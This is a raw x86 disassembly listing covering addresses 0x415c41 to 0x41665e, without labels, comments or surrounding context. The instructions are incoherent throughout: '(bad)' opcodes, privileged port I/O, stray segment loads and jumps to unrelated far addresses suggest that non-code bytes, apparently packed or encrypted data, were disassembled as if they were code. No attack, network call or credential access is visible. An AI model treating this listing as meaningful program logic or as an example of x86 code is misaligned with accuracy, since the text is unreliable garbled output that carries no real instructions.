  415c41:	mov    edi,0xfc8f5e5b
  415c46:	dec    DWORD PTR [edx+0x244c6a63]
  415c4c:	inc    ebp
  415c4d:	sub    ecx,DWORD PTR [eax+0x75]
  415c50:	dec    edi
  415c51:	shl    ch,1
  415c53:	push   edi
  415c54:	cld    
  415c55:	enter  0x6e89,0x1c
  415c59:	add    eax,DWORD PTR [edi+0x74d790f8]
  415c5f:	pop    ds
  415c60:	stos   BYTE PTR es:[edi],al
  415c61:	ins    BYTE PTR es:[edi],dx
  415c62:	and    al,0xc
  415c64:	xchg   esi,eax
  415c65:	dec    esp
  415c66:	and    al,0xc
  415c68:	xchg   BYTE PTR [edi+0x6ca5c687],ah
  415c6e:	sti    
  415c6f:	inc    DWORD PTR [eax]
	...
  415c89:	stos   BYTE PTR es:[edi],al
  415c8a:	jge    0x415c4c
  415c8c:	je     0x415ca5
  415c8e:	jl     0x415c67
  415c90:	je     0x415c71
  415c92:	imul   edi,edi,0x8ca128a
  415c98:	push   edi
  415c99:	xor    eax,0xcd016e83
  415c9e:	xor    eax,eax
  415ca0:	pop    edi
  415ca1:	pop    ds
  415ca2:	jmp    0x3406e7a4
  415ca7:	rcl    BYTE PTR [esi-0xc],cl
  415caa:	pop    eax
  415cab:	mov    ebx,0xc45ae774
  415cb0:	add    al,0x7f
  415cb2:	lods   al,BYTE PTR ds:[esi]
  415cb3:	sub    dh,BYTE PTR [eax+edx*8-0xd]
  415cb7:	jne    0x415cc7
  415cb9:	ss pop ebx
  415cbb:	les    eax,FWORD PTR [edi+ebx*8]
  415cbe:	or     al,0x72
  415cc0:	lock (bad) 
  415cc2:	fwait
  415cc3:	dec    ebx
  415cc4:	ret    0xdbf0
  415cc7:	mov    cl,0xff
  415cc9:	mov    ss,esp
  415ccb:	pop    eax
  415ccc:	mov    DWORD PTR [eax-0xaf322a3],ecx
  415cd2:	fild   DWORD PTR [ecx]
  415cd4:	push   esi
  415cd5:	daa    
  415cd6:	scas   al,BYTE PTR es:[edi]
  415cd7:	jp     0x415d1c
  415cd9:	add    al,0xf3
  415cdb:	ret    
  415cdc:	jbe    0x415c87
  415cde:	pop    edx
  415cdf:	jmp    0x332a25e1
  415ce4:	ror    BYTE PTR [ebp-0xbfffd6c],cl
  415cea:	xchg   ah,dh
  415cec:	add    BYTE PTR [bx+si],al
	...
  415d03:	add    BYTE PTR [eax],al
  415d05:	add    BYTE PTR [esi],ah
  415d07:	test   BYTE PTR [edx],al
  415d09:	add    ah,dh
  415d0b:	je     0x415d55
  415d0d:	clc    
  415d0e:	jge    0x415d21
  415d10:	lock mov DWORD PTR [ecx+0x3cf541cb],edi
  415d17:	rol    ecx,cl
  415d19:	mov    eax,ecx
  415d1b:	arpl   WORD PTR [edx],sp
  415d1d:	mov    edi,0x8b53ada4
  415d22:	jns    0x415d6c
  415d24:	jmp    0x415d23
  415d26:	sti    
  415d27:	stos   DWORD PTR es:[edi],eax
  415d28:	push   ebx
  415d29:	lds    edi,FWORD PTR [ecx+0x27]
  415d2c:	jmp    0x415d2b
  415d2e:	jmp    0x415d0c
  415d30:	add    DWORD PTR [eax],eax
  415d32:	hlt    
  415d33:	fs mov al,0xf8
  415d36:	ficom  DWORD PTR [esi]
  415d38:	out    dx,al
  415d39:	std    
  415d3a:	jmp    0x34599443
  415d3f:	add    eax,0x70c3eb6a
  415d44:	rcl    DWORD PTR [ebp-0x47],0x6f
  415d48:	fucomi st,st(6)
  415d4a:	daa    
  415d4b:	std    
  415d4c:	popf   
  415d4d:	out    dx,al
  415d4e:	pop    es
  415d4f:	and    eax,0x29f443d5
  415d54:	sub    eax,0xa41bfc6d
  415d59:	call   DWORD PTR [edx+0x72aef40]
  415d5f:	stc    
  415d60:	pop    ebp
  415d61:	jge    0x415d28
  415d63:	les    edx,FWORD PTR [eax]
  415d65:	ja     0x415d4f
  415d67:	cmc    
  415d68:	jb     0x415d2e
	...
  415d82:	add    dl,dl
  415d84:	mov    ebx,0x32f400a9
  415d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d8a:	fldcw  WORD PTR [ecx+0x4f]
  415d8d:	(bad)  
  415d8e:	loopne 0x415d3b
  415d90:	dec    ebp
  415d91:	ret    0x510c
  415d94:	outs   dx,DWORD PTR ds:[esi]
  415d95:	idiv   DWORD PTR [eax-0x31]
  415d98:	cld    
  415d99:	popf   
  415d9a:	aas    
  415d9b:	lock pop edx
  415d9d:	call   0x38271520
  415da2:	fmul   st(1),st
  415da4:	in     eax,0x86
  415da6:	in     eax,dx
  415da7:	jo     0x415d6d
  415da9:	repz (bad) 
  415dab:	je     0x415e14
  415dad:	jecxz  0x415db2
  415daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415db0:	loop   0x415de9
  415db2:	add    esi,DWORD PTR [ecx-0xbffd645]
  415db8:	xor    ah,BYTE PTR [edi]
  415dba:	(bad)  [ecx]
  415dbc:	pop    edx
  415dbd:	out    0xec,eax
  415dbf:	and    BYTE PTR [eax],0xf7
  415dc2:	in     al,dx
  415dc3:	push   0x60ecd729
  415dc8:	sub    edi,edx
  415dca:	in     al,dx
  415dcb:	pop    es
  415dcc:	sbb    eax,0x537df00
  415dd1:	cmp    DWORD PTR [ebp+0x7d0d111b],esp
  415dd7:	mov    al,0xc7
  415dd9:	or     al,0xe9
  415ddb:	rcr    BYTE PTR [ecx+0xb1dbf05],0x6a
  415de2:	call   0xd155402e
	...
  415dff:	add    BYTE PTR [ecx],al
  415e01:	inc    ebp
  415e02:	add    BYTE PTR [edx-0x58],dh
  415e05:	xchg   dh,bh
  415e07:	mul    BYTE PTR [ebx]
  415e09:	sub    dh,BYTE PTR [ecx]
  415e0b:	sub    DWORD PTR [edx],ebx
  415e0d:	xchg   BYTE PTR ds:0xc07788eb,bh
  415e13:	xor    DWORD PTR [ebp-0x1b],esi
  415e16:	hlt    
  415e17:	push   0xffffffb7
  415e19:	add    DWORD PTR [eax+0x36],edx
  415e1c:	retf   0x13e1
  415e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e20:	add    al,BYTE PTR [ebp+0x0]
  415e23:	fs aaa 
  415e25:	pop    ecx
  415e26:	or     bl,BYTE PTR [edi]
  415e28:	dec    ecx
  415e29:	clc    
  415e2a:	xor    edx,edi
  415e2c:	mov    bh,0x4
  415e2e:	xor    DWORD PTR [edi+0x3fc68e58],0x85893835
  415e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e39:	push   ebx
  415e3a:	push   ecx
  415e3b:	ss call 0xd899:0x28f1c0a3
  415e43:	mov    edx,0xe1439010
  415e48:	(bad)  
  415e49:	cmp    DWORD PTR [ebp+0x6e],edx
  415e4c:	mov    cl,BYTE PTR [edi+eax*4]
  415e4f:	in     al,0x1b
  415e51:	mov    WORD PTR [ebx+0x61],?
  415e54:	adc    al,bh
  415e56:	sar    esp,cl
  415e58:	mov    bh,0x4
  415e5a:	sub    DWORD PTR [ecx],0x6b
  415e5d:	or     eax,0xf1250081
  415e62:	in     eax,0x82
	...
  415e7c:	add    ch,cl
  415e7e:	pop    es
  415e7f:	add    BYTE PTR [esi+0x56],dl
  415e82:	pop    ebx
  415e83:	or     bl,ch
  415e85:	rcr    DWORD PTR [esi+eax*2+0x4],cl
  415e89:	pop    esi
  415e8a:	lock add dh,BYTE PTR [ebp-0x43]
  415e8e:	lock jbe 0x415ea1
  415e91:	loop   0x415eec
  415e93:	sbb    al,ch
  415e95:	pusha  
  415e96:	inc    edx
  415e97:	std    
  415e98:	jmp    DWORD PTR [ebx+ecx*2]
  415e9b:	cld    
  415e9c:	jmp    0x415e5c
  415e9e:	test   al,bh
  415ea0:	pop    ss
  415ea1:	sbb    dl,ah
  415ea3:	cld    
  415ea4:	jbe    0x415e53
  415ea6:	lock jbe 0x415ec1
  415ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eaa:	and    BYTE PTR [ecx+0x1],ch
  415ead:	lea    esp,[eax+0x41]
  415eb0:	clc    
  415eb1:	push   ss
  415eb2:	push   edi
  415eb3:	sbb    al,0x3b
  415eb5:	dec    edx
  415eb6:	push   ebp
  415eb7:	into   
  415eb8:	jmp    FWORD PTR [eax]
  415eba:	loope  0x415eb8
  415ebc:	adc    eax,0x3ff6f1
  415ec1:	(bad)  
  415ec2:	inc    ebp
  415ec3:	cld    
  415ec4:	xor    DWORD PTR [ebx-0x11],0x37
  415ec8:	(bad)  
  415ec9:	jmp    0xfc39e7ab
  415ece:	popa   
  415ecf:	pop    eax
  415ed0:	add    dh,BYTE PTR [ebp+0x30]
  415ed3:	sti    
  415ed4:	inc    DWORD PTR [edx-0xf740f9d]
  415eda:	lock cmp edi,0xfe7ef729
	...
  415ef9:	add    BYTE PTR [edx-0x6b99f8ab],ah
  415eff:	dec    edi
  415f00:	add    ch,al
  415f02:	cld    
  415f03:	out    dx,eax
  415f04:	sti    
  415f05:	inc    DWORD PTR [esi-0xb8a0428]
  415f0b:	cmp    esp,ebx
  415f0d:	(bad)  
  415f0e:	pusha  
  415f0f:	in     eax,dx
  415f10:	add    ebp,edi
  415f12:	popa   
  415f13:	inc    esp
  415f14:	fadd   QWORD PTR [edi-0x76fe12b0]
  415f1a:	mov    dl,0x7a
  415f1c:	dec    edx
  415f1d:	pop    ecx
  415f1e:	mov    ebp,0x2200002e
  415f23:	mov    ds:0x3af3f87e,eax
  415f28:	add    DWORD PTR [edx-0xe],ebp
  415f2b:	test   DWORD PTR [eax+edx*2],eax
  415f2e:	mov    bl,0xd9
  415f30:	sbb    DWORD PTR [esi],edx
  415f32:	xor    al,0xec
  415f34:	jle    0x415f26
  415f36:	ja     0x415f1a
  415f38:	jmp    0x7766:0xc19f3774
  415f3f:	mov    bl,0x3
  415f41:	or     eax,0x8139ac61
  415f46:	xchg   esp,eax
  415f47:	mov    eax,0x1bd8c086
  415f4c:	push   ecx
  415f4d:	push   esi
  415f4e:	jae    0x415f29
  415f50:	sbb    eax,0x80ebb416
  415f55:	shr    cl,0xf0
  415f58:	pop    ebx
  415f59:	inc    ecx
  415f5b:	call   0x0:0x3c10
	...
  415f76:	add    dl,ch
  415f78:	sub    eax,DWORD PTR [ebx+eax*4]
  415f7b:	xor    al,0x0
  415f7d:	or     edi,ebp
  415f7f:	jmp    0xf4817033
  415f84:	and    DWORD PTR [ebp-0x8],edi
  415f87:	xor    ebx,ecx
  415f89:	sub    eax,0x52ebb416
  415f8e:	std    
  415f8f:	or     DWORD PTR [edi+ecx*1-0x48910bc0],ebx
  415f96:	std    
  415f97:	mov    bl,0x66
  415f99:	mov    edi,0xbc05375e
  415f9e:	js     0x415f30
  415fa0:	sub    BYTE PTR [ebx-0x7c],ch
  415fa3:	or     ch,dh
  415fa5:	jmp    0x415faa
  415fa7:	hlt    
  415fa8:	cmp    dh,BYTE PTR [esi-0x234ad082]
  415fae:	inc    ebx
  415faf:	hlt    
  415fb0:	adc    eax,0x8c57de35
  415fb5:	mov    esp,0xc3980b73
  415fba:	jmp    0x476d:0x4d9de1c9
  415fc1:	xchg   edi,eax
  415fc2:	jle    0x416034
  415fc4:	xchg   DWORD PTR [edi-0x16],edi
  415fc7:	mov    cl,0xe1
  415fc9:	rol    dh,cl
  415fcb:	daa    
  415fcc:	or     eax,0x8c203872
  415fd1:	lods   al,BYTE PTR ds:[esi]
  415fd2:	push   edi
  415fd3:	lea    eax,ds:0x3b204860
  415fd9:	jg     0x415fde
	...
  415ff3:	add    al,dh
  415ff5:	add    al,0xe7
  415ff7:	jbe    0x416068
  415ff9:	push   0x3379e9e2
  415ffe:	aaa    
  415fff:	jmp    0x4436850b
  416004:	hlt    
  416005:	mov    ebp,DWORD PTR [esp+ebx*2]
  416008:	jne    0x415fe6
  41600a:	call   0x177c2076
  41600f:	ja     0x416088
  416011:	push   0x3449e9b2
  416016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416017:	outs   dx,DWORD PTR ds:[esi]
  416018:	shl    cl,1
  41601a:	hlt    
  41601b:	sub    esp,edx
  41601d:	inc    esp
  41601e:	out    0x2c,eax
  416020:	mov    bh,0x6c
  416022:	adc    al,0x27
  416024:	sub    DWORD PTR [edi-0x9],eax
  416027:	jl     0x415fe0
  416029:	push   esp
  41602a:	ret    0x907e
  41602d:	loope  0x41602f
  41602f:	jbe    0x41604e
  416031:	push   esi
  416032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416033:	(bad)  
  416034:	retf   
  416035:	pusha  
  416036:	push   esi
  416037:	mov    edi,0x5e6c857e
  41603c:	or     eax,0x736456df
  416041:	imul   edi,ebp,0x5635dd4e
  416047:	arpl   WORD PTR cs:[ecx-0x3],bp
  41604b:	ds int 0x3
  41604e:	add    cl,ch
  416050:	test   DWORD PTR [edi-0x1d233e65],0x26fd
	...
  41606e:	add    BYTE PTR [eax],al
  416070:	add    BYTE PTR [ebp-0x4317077a],ah
  416076:	mov    ebp,DWORD PTR [esi+edx*1-0x63]
  41607a:	loop   0x4160d9
  41607c:	scas   eax,DWORD PTR es:[edi]
  41607d:	jo     0x416043
  41607f:	je     0x4160b1
  416081:	mov    edx,0x18940009
  416086:	icebp  
  416087:	jg     0x41608e
  416089:	mov    edi,ds
  41608b:	std    
  41608c:	jmp    0xf19ceeb1
  416091:	and    eax,0xba72f08e
  416096:	adc    BYTE PTR [ebx-0x87a08d9],cl
  41609c:	sub    ecx,esp
  41609e:	push   edi
  41609f:	sub    DWORD PTR [ecx-0x64cf032d],0xffffff88
  4160a6:	in     eax,dx
  4160a7:	add    ecx,ebp
  4160a9:	neg    ecx
  4160ab:	icebp  
  4160ac:	bound  esi,QWORD PTR [edx+0x1fbb670c]
  4160b2:	push   es
  4160b3:	add    cl,ch
  4160b5:	mov    esi,0xc260f843
  4160ba:	loopne 0x416126
  4160bc:	in     eax,0xc0
  4160be:	mov    eax,DWORD PTR [ebx-0x4118b00]
  4160c4:	(bad)  
  4160c5:	std    
  4160c6:	pop    ebx
  4160c7:	mov    esp,esi
  4160c9:	mov    ebp,esp
  4160cb:	sti    
  4160cc:	call   0x3ea2b7
  4160d1:	nop
  4160d2:	aad    0x74
  4160d4:	adc    eax,0x0
	...
  4160ed:	add    BYTE PTR [esi-0x201f423b],al
  4160f3:	xor    edi,ebx
  4160f5:	jne    0x4160e4
  4160f7:	push   esi
  4160f8:	cmp    esp,0x50fbed3b
  4160fe:	inc    ebp
  4160ff:	dec    edx
  416100:	addr16 add ebp,ebx
  416103:	sbb    al,al
  416105:	cmp    edx,DWORD PTR [eax+0x154d8ad7]
  41610b:	adc    eax,eax
  41610d:	and    ecx,DWORD PTR [esp+esi*1]
  416110:	push   0x0
  416112:	ja     0x416117
  416114:	mov    DWORD PTR [ebp-0x411ff],eax
  41611a:	jge    0x41615d
  41611c:	add    bh,bh
  41611e:	shl    BYTE PTR [ebx+0x5e9d4011],0xc0
  416125:	jne    0x4160c8
  416127:	cmp    ecx,DWORD PTR [edi+eiz*1-0x73]
  41612b:	add    edi,ebx
  41612d:	adc    eax,0x400edd
  416132:	fisub  WORD PTR [eax-0x5dd9a105]
  416138:	ret    0x4d0c
  41613b:	cmp    al,0xff
  41613e:	and    ebx,edx
  416140:	das    
  416141:	test   BYTE PTR [edx-0x2f7250ec],0xd4
  416148:	(bad)  
  416149:	call   FWORD PTR [edx+0x5afc39c0]
  41614f:	out    0x84,eax
  416151:	rol    BYTE PTR [eax],0x0
	...
  416168:	add    BYTE PTR [eax],al
  41616a:	add    ah,dh
  41616c:	add    ah,bh
  41616e:	inc    ebp
  41616f:	ja     0x416100
  416171:	add    esi,DWORD PTR [edx+0xc]
  416174:	jb     0x416144
  416176:	mov    eax,esi
  416178:	sbb    bl,cl
  41617a:	aam    0xa9
  41617c:	(bad)  
  41617d:	fdivr  st,st(5)
  41617f:	add    ecx,0xed8ec032
  416185:	out    0x73,al
  416187:	in     al,dx
  416188:	lods   eax,DWORD PTR ds:[esi]
  416189:	fldcw  WORD PTR [edx]
  41618b:	repz aaa 
  41618d:	in     eax,0x81
  41618f:	in     al,dx
  416190:	dec    edi
  416191:	jo     0x4161a7
  416193:	jno    0x41612e
  416195:	cmc    
  416196:	dec    esi
  416197:	dec    esi
  416198:	in     al,dx
  416199:	push   ecx
  41619a:	lds    edi,FWORD PTR [ecx]
  41619c:	call   0xec356222
  4161a1:	out    0x13,al
  4161a3:	xor    al,0xde
  4161a5:	inc    ecx
  4161a6:	add    BYTE PTR [ecx],bl
  4161a8:	sub    bh,ah
  4161aa:	push   DWORD PTR [esi-0xa]
  4161ad:	in     al,0x74
  4161af:	add    al,0x82
  4161b1:	call   DWORD PTR [ebp-0x5d]
  4161b4:	ror    DWORD PTR [ecx],0x16
  4161b7:	xor    al,0xec
  4161b9:	dec    ebx
  4161ba:	std    
  4161bb:	jmp    0xf4816d5f
  4161c0:	sub    dh,ch
  4161c2:	mov    ah,0xfa
  4161c4:	push   ds
  4161c5:	pop    edx
  4161c6:	femms  
  4161c8:	jmp    0x400e:0x409fd51
	...
  4161e7:	add    ah,dh
  4161e9:	(bad)  
  4161ea:	jmp    0x6e08c570
  4161ef:	and    eax,0x815bac27
  4161f4:	adc    ch,dl
  4161f6:	not    BYTE PTR [edx-0x1f7edbcc]
  4161fc:	dec    eax
  4161fd:	add    eax,0x34d8c36a
  416202:	xor    eax,0xcaf8314f
  416207:	or     eax,0xc36404b4
  41620c:	test   al,0xa
  41620e:	push   ds
  41620f:	out    0x7,eax
  416211:	sbb    ebp,edx
  416213:	inc    ebx
  416214:	hlt    
  416215:	and    DWORD PTR [esi+0xec67de6],0x5389a7c3
  41621f:	adc    BYTE PTR [eax],0xdd
  416222:	push   0xffffffd7
  416224:	pop    eax
  416225:	xor    ah,BYTE PTR [edx-0x37]
  416228:	jmp    0x5dc53d6e
  41622d:	or     eax,0x11357ae8
  416232:	xchg   ebp,eax
  416233:	dec    esi
  416234:	jge    0x416209
  416236:	mov    esp,0xc3dc74f8
  41623b:	ins    DWORD PTR es:[edi],dx
  41623c:	in     al,dx
  41623d:	push   0xffffffe9
  41623f:	dec    ebx
  416240:	shl    esp,cl
  416242:	out    0x3,eax
  416244:	hlt    
  416245:	push   0xffffffe3
  416247:	js     0x416271
  416249:	sub    edi,eax
  41624b:	dec    ebx
	...
  416264:	add    BYTE PTR [eax+ecx*1+0x36f402f7],cl
  41626b:	jb     0x41622b
  41626d:	and    al,0x6b
  41626f:	test   eax,0xc3587f46
  416274:	xor    ecx,DWORD PTR [esi+eiz*2+0x3bf40340]
  41627b:	inc    eax
  41627c:	jg     0x4162b2
  41627e:	pop    ebp
  41627f:	fbstp  TBYTE PTR [eax]
  416281:	xor    al,0x44
  416283:	shr    BYTE PTR [esi+0x30e704f4],0x59
  41628a:	inc    ebp
  41628b:	push   ss
  41628c:	ja     0x416246
  41628e:	sub    BYTE PTR [eax],al
  416290:	add    eax,0x5cf613a0
  416295:	mov    ah,0x28
  416297:	and    al,0x39
  416299:	mov    edi,0xaed12458
  41629e:	pop    eax
  41629f:	and    al,0xc5
  4162a1:	scas   al,BYTE PTR es:[edi]
  4162a2:	pop    eax
  4162a3:	and    al,0xd9
  4162a5:	aas    
  4162a6:	inc    edi
  4162a7:	mov    esi,0xc088f7e8
  4162ac:	ins    BYTE PTR es:[edi],dx
  4162ad:	mov    ah,0x28
  4162af:	sbb    al,0xe6
  4162b1:	mov    eax,DWORD PTR [edx-0x20081700]
  4162b7:	xor    DWORD PTR [ecx-0x2dbb77e],edi
  4162bd:	iret   
  4162be:	mov    edi,DWORD PTR [eax+ebp*8-0x2a3f7f09]
  4162c5:	dec    ecx
  4162c6:	fidiv  DWORD PTR [ebp+ecx*1+0x0]
	...
  4162e2:	add    al,0x8e
  4162e4:	inc    esp
  4162e5:	add    eax,0x1cdeecfc
  4162ea:	test   DWORD PTR [edi+eiz*1],0x38fce3a5
  4162f1:	das    
  4162f2:	push   edx
  4162f3:	xor    eax,0xfd13a589
  4162f8:	imul   eax,esp,0x1657b6e4
  4162fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ff:	push   ds
  416300:	(bad)  
  416301:	jl     0x416339
  416303:	test   BYTE PTR [ebp+eax*8-0x19],dh
  416307:	sbb    eax,0x8df37fc6
  41630c:	jl     0x4162d3
  41630e:	repz (bad) 
  416310:	lock out 0x4,al
  416313:	add    eax,ebp
  416315:	shr    cl,cl
  416317:	(bad)  
  416319:	ins    DWORD PTR es:[edi],dx
  41631a:	aaa    
  41631b:	push   ecx
  41631c:	add    al,0xce
  41631e:	and    esp,DWORD PTR [ecx]
  416320:	adc    BYTE PTR [eax],al
  416322:	into   
  416323:	cwde   
  416324:	sub    DWORD PTR [esi+0x8],ecx
  416327:	mov    edi,0xf4f974fb
  41632c:	out    0x40,eax
  41632e:	mov    ah,0x7
  416330:	add    BYTE PTR [ebp-0x17e3daf7],cl
  416336:	scas   eax,DWORD PTR es:[edi]
  416337:	lods   eax,DWORD PTR ds:[esi]
  416338:	std    
  416339:	dec    DWORD PTR [esi-0x38]
  41633c:	xor    eax,0xaf83974
  416341:	xchg   esp,eax
  416342:	dec    ebp
  416343:	mov    ebp,0xff14
	...
  41635c:	add    BYTE PTR [eax],al
  41635e:	add    BYTE PTR [ecx],cl
  416360:	cld    
  416361:	adc    ebp,eax
  416363:	ds aas 
  416365:	std    
  416366:	jmp    DWORD PTR [eax-0x5ae3dbe5]
  41636c:	push   0xffffffba
  41636e:	add    ebp,ebx
  416370:	pop    esp
  416371:	ret    
  416372:	pop    edi
  416373:	mov    ds:0x90e5874c,eax
  416378:	les    edx,FWORD PTR [ecx-0x75]
  41637b:	inc    ecx
  41637c:	xchg   esp,ebp
  41637e:	test   bl,bl
  416380:	pop    es
  416381:	add    BYTE PTR [ebx-0x32],dl
  416384:	int3   
  416385:	push   esi
  416386:	push   edi
  416387:	push   esp
  416388:	inc    ebx
  416389:	loopne 0x416314
  41638b:	mov    al,0xbb
  41638d:	test   DWORD PTR [ebp+0xd],ebx
  416390:	pop    edi
  416391:	pop    ecx
  416392:	hlt    
  416393:	adc    al,0x43
  416395:	les    ecx,FWORD PTR [ecx+0x5d859f50]
  41639b:	stc    
  41639c:	sub    al,0xbf
  41639e:	je     0x416403
  4163a0:	ror    BYTE PTR [ebx+0x79d95],1
  4163a6:	add    DWORD PTR [ebp+0xe167e04],0xffffffb9
  4163ad:	dec    DWORD PTR [esi]
  4163af:	fmul   DWORD PTR [edi-0x120c0000]
  4163b5:	loop   0x41642a
  4163b7:	lock cmp BYTE PTR [edi-0x10],al
  4163bb:	dec    esp
  4163bc:	pop    es
  4163bd:	(bad)  
  4163be:	call   DWORD PTR [ebx-0x4a]
  4163c1:	pop    esi
  4163c2:	mov    DWORD PTR [eax],eax
	...
  4163dc:	mov    ecx,0xf8478ee5
  4163e1:	mov    dx,WORD PTR [eax-0x7efe120b]
  4163e8:	sub    al,0xef
  4163ea:	adc    dl,BYTE PTR [esp+esi*1+0x71b44765]
  4163f1:	and    BYTE PTR [eax-0x2c0796b0],dh
  4163f7:	dec    edi
  4163f8:	jge    0x416422
  4163fa:	mov    al,0x87
  4163fc:	mov    eax,ds:0x3c5b8b1d
  416401:	test   ecx,edi
  416403:	jae    0x4163f9
  416405:	in     eax,dx
  416406:	out    dx,al
  416407:	dec    ebx
  416408:	cmp    DWORD PTR [ecx-0x7c],0xec33ebf7
  41640f:	pop    ecx
  416410:	enter  0x1ed,0x8b
  416414:	cdq    
  416415:	and    eax,0x23d3fddb
  41641a:	inc    edi
  41641b:	call   0x435000
  416420:	jno    0x416473
  416422:	jo     0x416421
  416424:	mov    ebx,0x85b4ec23
  416429:	in     eax,dx
  41642a:	add    DWORD PTR [edx-0xb],ebp
  41642d:	retfw  0x318b
  416431:	cld    
  416432:	jmp    0x4163dd
  416434:	imul   ebp,ebp,0xc9bb8101
  41643a:	loop   0x416487
  41643c:	pushf  
  41643d:	pop    ecx
  41643e:	in     al,0x68
	...
  416458:	add    BYTE PTR [ecx+eiz*8+0x1],al
  41645c:	add    BYTE PTR [ecx+0x5],ch
  41645f:	ins    BYTE PTR es:[edi],dx
  416460:	sub    DWORD PTR [ebx-0x26],0xffffffde
  416464:	ss (bad) 
  416466:	frndint 
  416468:	xor    ecx,DWORD PTR [edx]
  41646a:	inc    ebp
  41646b:	out    0x86,eax
  41646d:	xor    BYTE PTR [ecx],cl
  41646f:	push   ecx
  416470:	add    eax,0x33b7407f
  416475:	jge    0x4164b7
  416477:	fisttp WORD PTR [esi+0x36bf009c]
  41647d:	sub    eax,0x2a16e705
  416482:	sbb    al,0x14
  416484:	fsub   DWORD PTR [edi-0x2c13c303]
  41648a:	ins    BYTE PTR es:[edi],dx
  41648b:	call   0x77917d93
  416490:	jmp    0x41646d
  416492:	ins    BYTE PTR es:[edi],dx
  416493:	call   0xcb2e069b
  416498:	imul   eax,DWORD PTR [ebx],0xffffffda
  41649b:	mov    ecx,0xe9b213c3
  4164a0:	add    esi,esp
  4164a2:	mov    edx,esp
  4164a4:	mov    edi,0xeb434f73
  4164a9:	int    0x74
  4164ab:	call   0x8380d7b3
  4164b0:	xchg   BYTE PTR [edi-0x1f],cl
  4164b3:	call   0xe81b9c81
  4164b8:	pusha  
  4164b9:	test   DWORD PTR [ebp+0xd7a4],0x0
	...
  4164d3:	add    BYTE PTR [eax],al
  4164d5:	add    ch,cl
  4164d7:	add    eax,0x8c4c0991
  4164dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164dd:	mov    bl,0x73
  4164df:	dec    edi
  4164e0:	call   FWORD PTR [ebx]
  4164e2:	daa    
  4164e3:	rcr    esi,1
  4164e5:	xchg   ecx,eax
  4164e6:	fild   DWORD PTR [esi]
  4164e8:	out    0x3,eax
  4164ea:	jge    0x416523
  4164ec:	or     ebp,DWORD PTR [esi-0x53]
  4164ef:	lock call FWORD PTR [edi+0x34]
  4164f3:	mov    ebp,0x11ab7487
  4164f8:	jae    0x4164b3
  4164fa:	add    eax,0xf7eb2c8b
  4164ff:	add    al,0x89
  416501:	sub    al,0xf0
  416503:	mov    eax,DWORD PTR [eax-0x1b]
  416506:	dec    edi
  416507:	adc    al,0xcc
  416509:	jmp    0xef01e605
  41650e:	jae    0x416501
  416510:	add    ecx,ebp
  416512:	test   DWORD PTR [ebx+0x5df19d7b],0xdccb70f0
  41651c:	xchg   DWORD PTR [esp+ebx*2],ebx
  41651f:	adc    DWORD PTR [ebx-0x7b],esi
  416522:	mov    esi,0x3414891f
  416527:	outs   dx,BYTE PTR ds:[esi]
  416528:	adc    al,0x74
  41652a:	mov    ebp,0x1519560c
  41652f:	cmc    
  416530:	push   edi
  416531:	fbstp  TBYTE PTR [edi-0x1b5a7efc]
  416537:	test   eax,eax
  416539:	fld    QWORD PTR [eax]
	...
  416553:	add    eax,0x796143da
  416558:	inc    esp
  416559:	clc    
  41655a:	push   0xffffffae
  41655c:	icebp  
  41655d:	cmp    BYTE PTR [ebx+ecx*8-0x520521ad],ah
  416564:	mov    es,WORD PTR [ebx+0x4d]
  416567:	out    dx,eax
  416568:	inc    ebx
  416569:	clc    
  41656a:	out    0x7a,al
  41656c:	ret    
  41656d:	(bad)  
  41656e:	call   0xe9d7816a
  416573:	test   DWORD PTR [ecx*1-0x2274596],0x144e72e9
  41657e:	pop    esp
  41657f:	inc    ebx
  416580:	mov    ecx,0x6b2400e8
  416585:	std    
  416586:	call   DWORD PTR [ecx]
  416588:	shl    DWORD PTR [esi+ebx*1+0x77],0xd0
  41658d:	mov    al,BYTE PTR [edi-0x6b]
  416590:	adc    al,0x87
  416592:	inc    ebp
  416593:	cmp    DWORD PTR [ecx],eax
  416595:	mov    edi,0x49cf4a50
  41659a:	push   ss
  41659b:	or     eax,0x39c47f01
  4165a0:	in     eax,0x41
  4165a2:	in     al,dx
  4165a3:	faddp  st(0),st
  4165a5:	adc    al,0x89
  4165a7:	call   0x55a0ef44
  4165ac:	adc    DWORD PTR [ecx+0x598b2d75],ecx
  4165b2:	test   al,0x85
  4165b4:	pop    ebp
  4165b5:	mov    es,WORD PTR [ecx]
	...
  4165cf:	add    BYTE PTR ds:0x940fc07f,bl
  4165d5:	push   ebp
  4165d6:	std    
  4165d7:	dec    DWORD PTR ds:0xad4ae811
  4165dd:	add    al,BYTE PTR [eax]
  4165df:	test   BYTE PTR [ebp-0xb],bl
  4165e2:	and    BYTE PTR [eax+0xc],0x4
  4165e6:	add    BYTE PTR [ebx-0x173176ae],cl
  4165ec:	jecxz  0x416576
  4165ee:	std    
  4165ef:	call   DWORD PTR [ecx-0x3c]
  4165f2:	or     eax,DWORD PTR [ebp+0x29a]
  4165f8:	dec    esi
  4165f9:	inc    edi
  4165fa:	sar    bh,0x5e
  4165fd:	aaa    
  4165fe:	in     al,0x32
  416600:	mov    esi,ecx
  416602:	cld    
  416603:	jne    0x41664e
  416605:	mov    DWORD PTR [edi-0x28a3018],edi
  41660b:	jmp    DWORD PTR [edi+edi*1]
  41660e:	rol    BYTE PTR [ebp+0x3087f4dd],0xf4
  416615:	in     al,dx
  416616:	add    DWORD PTR [eax],eax
  416618:	outs   dx,DWORD PTR ds:[esi]
  416619:	mov    al,ds:0xea348909
  41661e:	mov    WORD PTR [eax+0x1ec74],?
  416624:	and    DWORD PTR [eax+0x38e06ab1],0x46
  41662b:	mov    bh,al
  41662d:	sbb    eax,0xcfb813dd
  416632:	inc    ecx
	...
  41664b:	add    BYTE PTR [eax],al
  41664d:	ja     0x4165f8
  41664f:	adc    BYTE PTR [edx-0xb],ch
  416652:	inc    ebx
  416653:	or     al,0x8b
  416655:	mov    ecx,0xb8e83461
  41665a:	mov    BYTE PTR [eax+eax*1],0xce
  41665e:	in     al,dx
